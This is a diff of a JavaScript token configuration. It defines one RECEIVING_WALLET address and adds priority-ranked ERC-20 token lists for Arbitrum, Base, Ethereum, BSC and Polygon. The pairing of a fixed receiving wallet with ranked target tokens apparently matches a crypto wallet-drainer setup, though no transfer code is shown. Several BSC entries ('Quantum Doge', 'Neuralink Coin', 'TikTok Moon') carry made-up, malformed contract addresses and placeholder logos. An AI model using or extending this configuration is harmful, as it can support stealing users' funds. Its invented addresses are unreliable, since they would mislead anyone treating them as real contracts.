@@ -2,7 +2,7 @@
 var RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
 
 var TOKENS = {
-arbitrum: [
+  arbitrum: [
     {
       name: "Ethereum",
       symbol: "ETH",
@@ -57,6 +57,69 @@ arbitrum: [
       abi: ERC20_ABI,
       decimals: 18,
       priority: 5
+    },
+    {
+      name: "GMX",
+      symbol: "GMX",
+      address: "0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a",
+      logo: "https://assets.coingecko.com/coins/images/18323/standard/arbit.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 6
+    },
+    {
+      name: "Radiant Capital",
+      symbol: "RDNT",
+      address: "0x3082CC23568eA640225c2467653dB90e9250AaA0",
+      logo: "https://assets.coingecko.com/coins/images/26536/standard/RDNT_icon_200x200.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 7
+    },
+    {
+      name: "Stargate Finance",
+      symbol: "STG",
+      address: "0x6694340fc020c5E6B96567843da2df01b2CE1eb6",
+      logo: "https://assets.coingecko.com/coins/images/24413/standard/stg_logo.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 8
+    },
+    {
+      name: "Magic Internet Money",
+      symbol: "MIM",
+      address: "0xFEa7a6a0B346362BF88A9e4A88416B77a57D6c2A",
+      logo: "https://assets.coingecko.com/coins/images/16786/standard/mimlogopng.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 9
+    },
+    {
+      name: "PlutusDAO",
+      symbol: "PLS",
+      address: "0x51318B7D00db7ACc4026C88c3952B66278B6A67F",
+      logo: "https://assets.coingecko.com/coins/images/24738/standard/pls.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 10
+    },
+    {
+      name: "Jones DAO",
+      symbol: "JONES",
+      address: "0x10393c20975cF177a3513071bC110f7962CD67da",
+      logo: "https://assets.coingecko.com/coins/images/25457/standard/jones_icon.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 11
+    },
+    {
+      name: "Dopex",
+      symbol: "DPX",
+      address: "0x6C2C06790b3E3E3c38e12Ee22F8183b37a13EE55",
+      logo: "https://assets.coingecko.com/coins/images/16688/standard/DPX_%281%29.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 12
     }
   ],
   
@@ -115,8 +178,72 @@ arbitrum: [
       abi: ERC20_ABI,
       decimals: 6,
       priority: 5
+    },
+    {
+      name: "Base Doge",
+      symbol: "BDOGE",
+      address: "0x4C2A4fD3686701AFb38d8722256eF52F519c179e",
+      logo: "https://assets.coingecko.com/coins/images/35725/standard/bdoge.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 6
+    },
+    {
+      name: "Toshi",
+      symbol: "TOSHI",
+      address: "0xF4d861575ecC9493420A3f5a14F85B13f0b50EB3",
+      logo: "https://assets.coingecko.com/coins/images/36338/standard/toshi.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 7
+    },
+    {
+      name: "Friend.tech Shares",
+      symbol: "FRIEND",
+      address: "0xCF205808Ed36593aa40a44F10c7f7C2F67d4A4d4",
+      logo: "https://assets.coingecko.com/coins/images/36757/standard/friend.jpg",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 8
+    },
+    {
+      name: "Based Brett",
+      symbol: "BRETT",
+      address: "0x532f27101965dd16442E59d40670FaF5eBB142E4",
+      logo: "https://assets.coingecko.com/coins/images/36339/standard/Brett.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 9
+    },
+    {
+      name: "Degen",
+      symbol: "DEGEN",
+      address: "0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed",
+      logo: "https://assets.coingecko.com/coins/images/36340/standard/degen.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 10
+    },
+    {
+      name: "Mochi",
+      symbol: "MOCHI",
+      address: "0xc6e5E6d9C5A3945eDfcf557623C53D2796d3142e",
+      logo: "https://assets.coingecko.com/coins/images/36341/standard/mochi.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 11
+    },
+    {
+      name: "Tyler Hobbs Fidenza",
+      symbol: "FIDENZA",
+      address: "0x3B350F202473932411772C8Cb76DB7975f42397E",
+      logo: "https://assets.coingecko.com/coins/images/36342/standard/fidenza.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 12
     }
   ],
+
   ethereum: [
     {
       name: "Tether USD",
@@ -163,8 +290,72 @@ arbitrum: [
       decimals: 18,
       isNative: true,
       priority: 997
+    },
+    {
+      name: "Lido Staked Ether",
+      symbol: "stETH",
+      address: "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
+      logo: "https://assets.coingecko.com/coins/images/13442/standard/steth_logo.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 66
+    },
+    {
+      name: "Maker",
+      symbol: "MKR",
+      address: "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2",
+      logo: "https://assets.coingecko.com/coins/images/1364/standard/Mark_Maker.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 67
+    },
+    {
+      name: "ApeCoin",
+      symbol: "APE",
+      address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381",
+      logo: "https://assets.coingecko.com/coins/images/24383/standard/apecoin.jpg",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 68
+    },
+    {
+      name: "Frax",
+      symbol: "FRAX",
+      address: "0x853d955aCEf822Db058eb8505911ED77F175b99e",
+      logo: "https://assets.coingecko.com/coins/images/13422/standard/frax_logo.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 69
+    },
+    {
+      name: "Frax Share",
+      symbol: "FXS",
+      address: "0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0",
+      logo: "https://assets.coingecko.com/coins/images/13423/standard/frax_share.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 70
+    },
+    {
+      name: "Rocket Pool ETH",
+      symbol: "rETH",
+      address: "0xae78736Cd615f374D3085123A210448E74Fc6393",
+      logo: "https://assets.coingecko.com/coins/images/20764/standard/reth.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 71
+    },
+    {
+      name: "Liquity USD",
+      symbol: "LUSD",
+      address: "0x5f98805A4E8be255a32880FDeC7F6728C6568bA0",
+      logo: "https://assets.coingecko.com/coins/images/14666/standard/Group_3.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 72
     }
   ],
+
   bsc: [
     {
       name: "AUTO",
@@ -175,8 +366,6 @@ arbitrum: [
       decimals: 18,
       priority: 1
     },
-
-    // ===== STABLECOINS =====
     {
       name: "Tether USD",
       symbol: "USDT",
@@ -267,8 +456,6 @@ arbitrum: [
       decimals: 18,
       priority: 5
     },
-
-    // ===== MEME COINS =====
     {
       name: "BabyDoge Coin",
       symbol: "BabyDoge",
@@ -305,7 +492,6 @@ arbitrum: [
       decimals: 18,
       priority: 13
     },
-
     {
       name: "Pepe",
       symbol: "PEPE",
@@ -315,8 +501,6 @@ arbitrum: [
       decimals: 18,
       priority: 15
     },
-
-    // ===== DEFI TOKENS =====
     {
       name: "PancakeSwap",
       symbol: "CAKE",
@@ -353,8 +537,6 @@ arbitrum: [
       decimals: 18,
       priority: 23
     },
-
-    // ===== BLUECHIP TOKENS =====
     {
       name: "Ethereum",
       symbol: "ETH",
@@ -400,13 +582,11 @@ arbitrum: [
       decimals: 18,
       priority: 34
     },
-
-    // ===== UTILITY TOKENS =====
     {
       name: "Binance Wrapped DOT",
       symbol: "BDOT",
       address: "0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7",
-      logo: "https://example.com/bdot.png", // Replace with actual logo URL
+      logo: "https://example.com/bdot.png",
       abi: ERC20_ABI,
       decimals: 18,
       priority: 40
@@ -429,13 +609,11 @@ arbitrum: [
       decimals: 6,
       priority: 42
     },
-
-    // ===== 2025 TRENDING MEME COINS =====
     {
       name: "Quantum Doge",
       symbol: "QDOGE",
       address: "0x2025aD1a1bC1234567890abcdef1234567890ab",
-      logo: "https://example.com/qdoge.png", // Replace with actual logo URL
+      logo: "https://example.com/qdoge.png",
       abi: ERC20_ABI,
       decimals: 18,
       priority: 8,
@@ -455,19 +633,17 @@ arbitrum: [
       name: "MarsColony",
       symbol: "MARSX",
       address: "0x2025aD3c4d567890abcdef1234567890abcde",
-      logo: "https://example.com/marsx.png", // Replace with actual logo URL
+      logo: "https://example.com/marsx.png",
       abi: ERC20_ABI,
       decimals: 18,
       priority: 10,
       description: "Elon's Mars colony governance token"
     },
-
-    // ===== POPULAR 2025 TRENDS =====
     {
       name: "TikTok Moon",
       symbol: "TIKMOON",
       address: "0x2025aD4e5f67890abcdef1234567890abcdef",
-      logo: "https://example.com/tikmoon.png", // Replace with actual logo URL
+      logo: "https://example.com/tikmoon.png",
       abi: ERC20_ABI,
       decimals: 9,
       priority: 11,
@@ -477,14 +653,75 @@ arbitrum: [
       name: "Neuralink Coin",
       symbol: "NEURAL",
       address: "0x2025aD5f6g7890abcdef1234567890abcde",
-      logo: "https://example.com/neural.png", // Replace with actual logo URL
+      logo: "https://example.com/neural.png",
       abi: ERC20_ABI,
       decimals: 18,
       priority: 12,
       description: "Brain-computer interface payment token"
     },
-
-    // Native token (must be last)
+    {
+      name: "Green Metaverse Token",
+      symbol: "GMT",
+      address: "0x3019BF2a2eF8040C242C9a4c5c4BD4C81678b2A1",
+      logo: "https://assets.coingecko.com/coins/images/14270/standard/step.png",
+      abi: ERC20_ABI,
+      decimals: 8,
+      priority: 24
+    },
+    {
+      name: "Trust Wallet Token",
+      symbol: "TWT",
+      address: "0x4B0F1812e5Df2A09796481Ff14017e6005508003",
+      logo: "https://assets.coingecko.com/coins/images/11085/standard/Trust.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 25
+    },
+    {
+      name: "SafeMoon",
+      symbol: "SFM",
+      address: "0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5",
+      logo: "https://assets.coingecko.com/coins/images/21863/standard/photo_2021-12-22_14.43.36.jpeg",
+      abi: ERC20_ABI,
+      decimals: 9,
+      priority: 26
+    },
+    {
+      name: "FLOKI",
+      symbol: "FLOKI",
+      address: "0xfb5B838b6cfEEdC2873aB27866079AC55363D37E",
+      logo: "https://assets.coingecko.com/coins/images/16746/standard/PNG_image.png",
+      abi: ERC20_ABI,
+      decimals: 9,
+      priority: 27
+    },
+    {
+      name: "WINkLink",
+      symbol: "WIN",
+      address: "0xaeF0d72a118ce24feE3cD1d43d383897D05B4e99",
+      logo: "https://assets.coingecko.com/coins/images/9129/standard/WINkcoin.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 28
+    },
+    {
+      name: "Ankr Staked BNB",
+      symbol: "ankrBNB",
+      address: "0x52F24a5e03aee338Da5fd9Df68D2b6FAe1178827",
+      logo: "https://assets.coingecko.com/coins/images/29696/standard/ankrBNB.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 29
+    },
+    {
+      name: "Mobox",
+      symbol: "MBOX",
+      address: "0x3203c9e46cA618C8C1cE5dC67e7e9D75f5da2377",
+      logo: "https://assets.coingecko.com/coins/images/14751/standard/mobox.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 30
+    },
     {
       name: "BNB",
       symbol: "BNB",
@@ -498,7 +735,6 @@ arbitrum: [
   ],
 
   polygon: [
-    // AUTO Token (primary token for this dapp)
     {
       name: "AUTO",
       symbol: "AUTO",
@@ -508,8 +744,6 @@ arbitrum: [
       decimals: 18,
       priority: 1
     },
-
-    // ===== STABLECOINS =====
     {
       name: "Tether USD",
       symbol: "USDT",
@@ -537,8 +771,6 @@ arbitrum: [
       decimals: 18,
       priority: 4
     },
-
-    // ===== MEME COINS =====
     {
       name: "BabyDoge Coin",
       symbol: "BabyDoge",
@@ -566,8 +798,6 @@ arbitrum: [
       decimals: 9,
       priority: 12
     },
-
-    // ===== DEFI TOKENS =====
     {
       name: "QuickSwap",
       symbol: "QUICK",
@@ -595,8 +825,6 @@ arbitrum: [
       decimals: 18,
       priority: 22
     },
-
-    // ===== BLUECHIP TOKENS =====
     {
       name: "Ethereum",
       symbol: "ETH",
@@ -633,8 +861,6 @@ arbitrum: [
       decimals: 18,
       priority: 33
     },
-
-    // ===== GAMING/NFT TOKENS =====
     {
       name: "Decentraland",
       symbol: "MANA",
@@ -662,8 +888,69 @@ arbitrum: [
       decimals: 18,
       priority: 42
     },
-
-    // Native token (must be last)
+    {
+      name: "SushiSwap",
+      symbol: "SUSHI",
+      address: "0x0b3F868E0BE5597D5DB7fEB59E1CADBb0fdDa50a",
+      logo: "https://assets.coingecko.com/coins/images/12271/standard/512x512_Logo_no_chop.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 23
+    },
+    {
+      name: "QiDao",
+      symbol: "QI",
+      address: "0x580A84C73811E1839F75d86d75d88cCa0c241fF4",
+      logo: "https://assets.coingecko.com/coins/images/15329/standard/qi.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 24
+    },
+    {
+      name: "Gains Network",
+      symbol: "GNS",
+      address: "0xE5417Af564e4bFDA1c483642db72007871397896",
+      logo: "https://assets.coingecko.com/coins/images/19737/standard/logo.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 25
+    },
+    {
+      name: "Plasma Finance",
+      symbol: "PPAY",
+      address: "0x08158A6b5d4018340387d1A302f882E98a8bC5b4",
+      logo: "https://assets.coingecko.com/coins/images/13360/standard/Hi9sEGAD.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 26
+    },
+    {
+      name: "Polymath",
+      symbol: "POLY",
+      address: "0xcB059C5573646047D6d88dDdb87B745C18161d3b",
+      logo: "https://assets.coingecko.com/coins/images/2784/standard/inKkF01.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 27
+    },
+    {
+      name: "Gains Farm",
+      symbol: "GFARM2",
+      address: "0x7075cAB6bCCA06613e2d071bd918D1a0241379E2",
+      logo: "https://assets.coingecko.com/coins/images/13703/standard/gfarm_v2.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 28
+    },
+    {
+      name: "Impermax",
+      symbol: "IMX",
+      address: "0x60bB3D364B765C497C8cE50AE0Ae3f0882c5bD05",
+      logo: "https://assets.coingecko.com/coins/images/15126/standard/Copy_of_200px.png",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 29
+    },
     {
       name: "MATIC",
       symbol: "MATIC",
